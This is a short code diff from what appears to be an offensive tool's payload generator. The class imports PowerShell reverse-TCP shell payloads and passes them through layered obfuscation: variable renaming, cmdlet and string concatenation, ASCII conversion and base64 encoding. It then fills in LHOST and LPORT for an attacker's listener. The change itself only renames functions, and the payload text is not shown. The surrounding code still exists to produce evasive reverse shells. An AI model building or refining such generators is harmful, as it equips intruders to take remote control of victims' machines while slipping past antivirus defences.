@@ -1,5 +1,4 @@
 from .common import *
-from .logging import *
 from .payloads import powershell_reverse_tcp, powershell_reverse_tcp_ssl
 from .settings import TCPServerSettings
 from .obfuscation import *
@@ -25,17 +24,18 @@ class PayloadGenerator:
 
     def obfuscation(self, payload):
 
-        payload = variableRename(payload)
-        payload = cmdletConcatenation(payload)
-        payload = cmdletToAscii(payload)
-        payload = methodConcatenation(payload)
-        payload = stringConcatenation(payload)
-        payload = stringToAscii(payload)
-        payload = base64Encode(payload)
+        payload = variable_rename(payload)
+        payload = cmdlet_concatenation(payload)
+        payload = cmdlet_to_ascii(payload)
+        payload = method_concatenation(payload)
+        payload = string_concatenation(payload)
+        payload = string_to_ascii(payload)
+        payload = base64_encode(payload)
 
         return payload
 
     def payloadConfig(self, payload):
+
         payload = payload.replace('LHOST', self.lhost)
         payload = payload.replace('LPORT', str(self.port))
 
